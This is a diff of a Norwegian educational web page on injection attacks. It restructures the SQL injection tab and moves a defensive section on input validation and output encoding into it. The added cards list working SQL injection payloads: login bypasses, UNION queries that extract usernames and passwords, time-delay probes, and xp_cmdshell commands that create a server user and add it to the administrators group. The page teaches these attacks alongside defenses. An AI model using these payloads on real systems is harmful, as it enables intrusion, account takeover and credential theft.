@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Gjør designet responsivt etter størrelsen-->
 <!-- width=device-width - gjør at designet tilpasses skjermbredden -->
  <!-- initial-scale=1.0 - setter utgangspunkt for zooming når siden først lastes i nettleseren -->
- <link rel="stylesheet" href="testtabs.css">
+ <link rel="stylesheet" href="Tabs.css">
 </head>
 <body>
 
@@ -48,74 +48,106 @@
   <p>Et angrep hvor en angriper injiserer skadelig SQL-kode i et spørringsspråk som brukes av applikasjonen.</p>
   <p>Dette er en underkategori til Command injections, der SQL-injeksjoner har ID 89, og er "child" til 74.</p>
   <p>Du kan lære mer om <a href="https://www.youtube.com/watch?v=1nJgupaUPEQ&list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf&index=1">SQL-injeksjoner.</a></p>
-  <div class="note-section" style="font-family: sans-serif; line-height: 1.6; max-width: 800px; border: 1px solid #ccc; padding: 20px; border-radius: 8px;">
-  <h3 style="color: #2c3e50;">SQL injections</h3>
-  <p>Et angrep hvor en angriper injiserer skadelig SQL-kode i et spørringsspråk som brukes av applikasjonen [1]. Dette skjer når brukerstyrte data inkluderes i SQL-spørringer på en usikker måte, slik at angriperen kan bryte ut av datakonteksten og endre selve spørringslogikken [2, 3].</p>
-    <div class="note-section" style="font-family: sans-serif; line-height: 1.6; max-width: 800px; border: 1px solid #ccc; padding: 20px; border-radius: 8px;">
-  <h3 style="color: #2c3e50;">Kategorisering av SQL-injeksjoner</h3>
-  <p>SQL-injeksjoner deles vanligvis inn i tre hovedkategorier basert på hvordan angriperen mottar data fra serveren.</p>
-
-  <h4 style="color: #2980b9;">1. In-band SQL-injeksjon (Classic)</h4>
-  <p>Dette er den vanligste og mest direkte formen for angrep, der angriperen bruker <strong>samme kommunikasjonskanal</strong> til både å utføre angrepet og hente ut resultatene [1].</p>
-  <ul>
-    <li><strong>UNION-basert:</strong> Bruker <code>UNION</code>-operatøren for å kombinere resultater fra den originale spørringen med data fra andre tabeller [1]. Dette er ofte den raskeste metoden for datatrekking [1].</li>
-    <li><strong>Feilbasert (Error-based):</strong> Utnytter detaljerte feilmeldinger fra databasen (f.eks. ODBC-feil) for å hente ut informasjon om databasens struktur og innhold [2, 3].</li>
-  </ul>
-
-  <h4 style="color: #e67e22;">2. Inferential SQL-injeksjon (Blind SQLi)</h4>
-  <p>Dette brukes når applikasjonen ikke returnerer data eller detaljerte feilmeldinger direkte i svaret [4]. Angriperen må i stedet <strong>utlede (infer)</strong> informasjon bit for bit ved å observere applikasjonens oppførsel [4, 5].</p>
-  <ul>
-    <li><strong>Betingede responser (Boolean-based):</strong> Angriperen sender logiske spørsmål (sant/usant) og ser om innholdet på siden endres eller om det oppstår en generisk feil [4, 6].</li>
-    <li><strong>Tidsforsinkelser (Time-delay):</strong> Angriperen tvinger databasen til å vente et bestemt antall sekunder før den svarer dersom en betingelse er sann [7]. Dette bekrefter sårbarheten selv uten synlige endringer i innholdet [5].</li>
-  </ul>
-
-  <h4 style="color: #c0392b;">3. Out-of-band SQL-injeksjon</h4>
-  <p>Dette er en avansert teknikk som brukes når man ikke kan hente data via selve webapplikasjonen [8]. Angrepet utnytter databasens evne til å opprette <strong>eksterne nettverksforbindelser</strong> [8].</p>
-  <ul>
-    <li><strong>Nettverkstrafikk:</strong> Databasen kan instrueres til å sende data via protokoller som <strong>HTTP, DNS eller SMB</strong> til en server angriperen kontrollerer [8-10].</li>
-    <li><strong>Eksempler:</strong> Bruk av <code>UTL_HTTP</code> eller <code>UTL_INADDR</code> i Oracle for å sende forespørsler ut av nettverket [8, 9].</li>
-  </ul>
-
-  <h4 style="color: #27ae60;">Sikringsanbefaling:</h4>
-  <p>Uansett type injeksjon er det primære forsvaret å bruke <strong>parameteriserte spørringer</strong> (prepared statements) [11, 12]. Dette skiller spørringens struktur fra brukerdataene, slik at dataene alltid tolkes som tekst og aldri som kode [13, 14].</p>
-</div>
   
-  <h4 style="color: #e67e22;">Eksempler på angrepsvektorer:</h4>
-  
-  <div style="background: #f9f9f9; border-left: 5px solid #e67e22; padding: 10px; margin-bottom: 15px;">
-    <strong>1. Omgåelse av innlogging (Bypass)</strong><br>
-    Ved å bruke kommentartegn eller logiske sannheter kan man lure databasen til å gi tilgang uten passord.<br>
-    <code>Brukernavn: admin'--</code> (Ignorerer passordsjekken) [4].<br>
-    <code>Brukernavn: ' OR 1=1--</code> (Logger ofte inn som første bruker i tabellen) [5].
-  </div>
+  <section class="variants">
+    <h2>Varianter av SQL-injeksjoner</h2>
+      <div class="card-grid">
+        <div class="card">
+          <h3>1. In-band (Classic)</h3>
+            <p>Dette er den vanligste og mest direkte formen for angrep, der angriperen bruker <strong>samme kommunikasjonskanal til både å utføre angrepet og hente ut resultatene</strong> </p>
+            <p><strong>UNION-basert:</strong> Bruker <code>UNION</code>-operatøren for å kombinere resultater fra den originale spørringen med data fra andre tabeller. Dette er ofte den raskeste metoden for datatrekking</p>
+            <p><strong>For eksempel</strong> be om brukernavn og passord til brukeren av applikasjonen. </p>
+            <p><strong>Feilbasert (Error-based):</strong> Utnytter detaljerte feilmeldinger fra databasen (f.eks. ODBC-feil) for å hente ut informasjon om databasens struktur og innhold </p>  
+            <p><strong>For eksempel:</strong> Du legger inn " i koden, og får en feilmelding, der feilemeldingen forteller deg databaseversjon, type database, og noen ganger hvilken sql-spørring som bir brukt i backend. </p>
+        </div>
+        <div class="card">
+          <h3>Inferential (Blind)</h3>
+          <p>Her henter man ikke ut noe fra databasen, men bruker <strong>Boolean</strong> og <strong>Time</strong></p>
+          <p><strong>Betingede responser (Boolean-based):</strong> Angriperen sender logiske spørsmål (sant/usant) og ser om innholdet på siden endres eller om det oppstår en feil </p>
+          <p><strong>Tidsforsinkelser (Time-delay):</strong> Angriperen tvinger databasen til å vente et bestemt antall sekunder før den svarer dersom en betingelse er sann. Dette bekrefter sårbarheten selv uten synlige endringer i innholdet.</p>
+        </div>
+        <div class="card">
+          <h3>Out-of-band</h3>
+            <p>Den som utfører angrepet er ute av stand til å bruke samme kanal som angrepet utføres i. </p>
+        </div>
+      </div>
+  </section>
 
-  <div style="background: #f9f9f9; border-left: 5px solid #e67e22; padding: 10px; margin-bottom: 15px;">
-    <strong>2. Hente ut data (UNION-basert)</strong><br>
-    Brukt for å kombinere den originale spørringen med data fra andre tabeller.<br>
-    <code>' UNION SELECT @@version, NULL, NULL--</code> (Henter databaseversjon på MS-SQL/MySQL) [6].<br>
-    <code>' UNION SELECT table_name, column_name, NULL FROM information_schema.columns--</code> (Kartlegger databasestrukturen) [7].
-  </div>
+  <p></p>
 
-  <div style="background: #f9f9f9; border-left: 5px solid #e67e22; padding: 10px; margin-bottom: 15px;">
-    <strong>3. Blind SQL-injeksjon (Inference/Time-delay)</strong><br>
-    Når applikasjonen ikke viser feilmeldinger, kan man bruke tidsforsinkelser for å bekrefte sårbarheter.<br>
-    <code>'; waitfor delay '0:30:0'--</code> (Tvinger en MS-SQL database til å vente i 30 sekunder) [8].
-  </div>
-
-  <div style="background: #f9f9f9; border-left: 5px solid #e67e22; padding: 10px; margin-bottom: 15px;">
-    <strong>4. Systemtilgang (OS Commands)</strong><br>
-    I visse konfigurasjoner kan man kjøre kommandoer direkte på serverens operativsystem.<br>
-    <code>'; exec master..xp_cmdshell 'dir'--</code> (Lister filer på serveren via MS-SQL) [9].
-  </div>
+   <section class="variants">
+    <h2>Eksempler på SQL-injeksjoner</h2>
+      <div class="card-grid">
+        <div class="card">
+          <h3>Omgåelse av innlogging (Bypass)</h3>
+          <p>Ved å bruke kommentartegn eller logiske sannheter kan man lure databasen til å gi tilgang uten passord. </p>
+          <p><code>Brukernavn: admin'--</code> (Ignorerer passordsjekken)</p>
+          <p><code>Brukernavn: ' OR 1=1--</code> (Logger ofte inn som første bruker i tabellen)</p>
+          <p><code>Brukernavn: ' OR 'a'='a'--</code> (En annen variant som alltid er sann)</p>
+          <p><code>Brukernavn: ' OR 1=1#</code> (MySQL bruker # som kommentartegn)</p>
+          <p><code>Brukernavn: ' OR '1'='1'--</code> (En variant som også er sann)</p>
+          <p><code>Brukernavn: ' OR '1'='1'#</code> (MySQL variant)</p> 
+          <h3>Hente ut data (UNION-basert)</h3>
+          <p><code>' UNION SELECT @@version, NULL, NULL--</code> (Henter databaseversjon på MS-SQL/MySQL)</p>
+          <p><code>' UNION SELECT table_name, column_name, NULL FROM information_schema.columns--</code> (Kartlegger databasestrukturen)</p>
+          <p><code>' UNION SELECT username, password, NULL FROM users--</code>  (Henter brukernavn og passord fra users-tabellen)</p>
+        </div>
+        <div class="card">
+          <h3>Blind SQL-injeksjon (Inference/Time-delay)</h3>
+          <p>Når applikasjonen ikke viser feilmeldinger, kan man bruke tidsforsinkelser for å bekrefte sårbarheter.<br>
+          <p><code>'; waitfor delay '0:30:0'--</code> (Tvinger en MS-SQL database til å vente i 30 sekunder) [8].</p>
+          <p><code>' OR IF(1=1, SLEEP(5), 0)--</code> (MySQL-variant som forsinker svaret i 5 sekunder hvis betingelsen er sann)</p>
+          <p><code>' OR IF(1=0, SLEEP(5), 0)--</code> (MySQL-variant som ikke forsinker svaret)</p>
+          <p><code>' OR 1=1; WAITFOR DELAY '0:0:5'--</code> (MS-SQL-variant som forsinker svaret i 5 sekunder)</p>
+          <p><code>' OR 1=0; WAITFOR DELAY '0:0:5'--</code> (MS-SQL-variant som ikke forsinker svaret)</p>  
+        </div>
+        <div class="card">
+          <h3>Systemtilgang (OS Commands)</h3>
+            <p>  I visse konfigurasjoner kan man kjøre kommandoer direkte på serverens operativsystem.</p>
+            <p><code>'; exec xp_cmdshell 'net user test test123 /add'--</code> (Legger til en ny bruker på serveren via MS-SQL).</p>
+            <p><code>'; exec xp_cmdshell 'net localgroup administrators test /add'--</code> (Legger den nye brukeren til administratorgruppen) [8].</p>
+            <p><code>'; exec xp_cmdshell 'net user test /delete'--</code> (Sletter den nye brukeren)</p> 
+            <p><code>'; exec master..xp_cmdshell 'dir'--</code> (Lister filer på serveren via MS-SQL)</p>
+        </div>
+      </div>
+  </section>
 
   <h4 style="color: #27ae60;">Sikringstiltak:</h4>
   <p>For å eliminere SQL-injeksjoner bør man alltid bruke <strong>parameteriserte spørringer</strong> (prepared statements) [10]. Dette skiller spørringens struktur fra dataene, slik at brukerinput aldri kan tolkes som kode [11]. I tillegg bør databasekontoen ha <strong>lavest mulige privilegier</strong> for å begrense skadeomfanget ved et angrep [12].</p>
+    <section class="security-measures">
+        <h2>Slik sikrer du nettsidene dine</h2>
+        <p>Følg den trefoldige tilnærmingen:</p>
 
-  <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
-  
-  <p style="font-size: 0.9em; color: #7f8c8d;">Dette er en underkategori til Command injections, der SQL-injeksjoner har ID 89, og er "child" til 74.</p>
-  <p>Du kan lære mer om <a href="https://www.youtube.com/watch?v=1nJgupaUPEQ&list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf&index=1" style="color: #3498db; text-decoration: none;">SQL-injeksjoner på YouTube.</a></p>
-</div>
+        <div class="step">
+            <h3>1. Validering av input</h3>
+            <ul>
+                <li>Bruk <strong>whitelist</strong> for tillatte tegn.</li>
+                <li>Begrens lengden på inputfelt.</li>
+                <li>Bruk regulære uttrykk (Regex) for spesifikke felt.</li>
+            </ul>
+            <details>
+                <summary>Se eksempler på Regex</summary>
+                <code>E-post: ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$</code><br>
+                <code>URL: ^(https?|ftp)://[^\s/$.?#].[^\s]*$</code>
+            </details>
+        </div>
+
+        <div class="step highlight">
+            <h3>2. Koding av output (Viktigst!)</h3>
+            <p>Konverter spesialtegn til HTML-entiteter før de skrives til skjerm:</p>
+            <table class="encoding-table">
+                <tr><th>Tegn</th><th>HTML-kode</th></tr>
+                <tr><td>&lt;</td><td><code>&amp;lt;</code></td></tr>
+                <tr><td>&gt;</td><td><code>&amp;gt;</code></td></tr>
+                <tr><td>&amp;</td><td><code>&amp;amp;</code></td></tr>
+            </table>
+        </div>
+
+        <div class="step">
+            <h3>3. Eliminer farlige innsettingspunkter</h3>
+            <p>Bruk <code>textContent</code> i stedet for <code>innerHTML</code> når du skriver til DOM-en med JavaScript.</p>
+        </div>
+    </section>
 </div>
 
 <div id="XPath" class="tabcontent">
@@ -162,42 +194,6 @@
             </div>
         </div>
     </section>
-
-    <section class="security-measures">
-        <h2>Slik sikrer du nettsidene dine</h2>
-        <p>Følg den trefoldige tilnærmingen:</p>
-
-        <div class="step">
-            <h3>1. Validering av input</h3>
-            <ul>
-                <li>Bruk <strong>whitelist</strong> for tillatte tegn.</li>
-                <li>Begrens lengden på inputfelt.</li>
-                <li>Bruk regulære uttrykk (Regex) for spesifikke felt.</li>
-            </ul>
-            <details>
-                <summary>Se eksempler på Regex</summary>
-                <code>E-post: ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$</code><br>
-                <code>URL: ^(https?|ftp)://[^\s/$.?#].[^\s]*$</code>
-            </details>
-        </div>
-
-        <div class="step highlight">
-            <h3>2. Koding av output (Viktigst!)</h3>
-            <p>Konverter spesialtegn til HTML-entiteter før de skrives til skjerm:</p>
-            <table class="encoding-table">
-                <tr><th>Tegn</th><th>HTML-kode</th></tr>
-                <tr><td>&lt;</td><td><code>&amp;lt;</code></td></tr>
-                <tr><td>&gt;</td><td><code>&amp;gt;</code></td></tr>
-                <tr><td>&amp;</td><td><code>&amp;amp;</code></td></tr>
-            </table>
-        </div>
-
-        <div class="step">
-            <h3>3. Eliminer farlige innsettingspunkter</h3>
-            <p>Bruk <code>textContent</code> i stedet for <code>innerHTML</code> når du skriver til DOM-en med JavaScript.</p>
-        </div>
-    </section>
-</div>
 
 </div>
 </main>
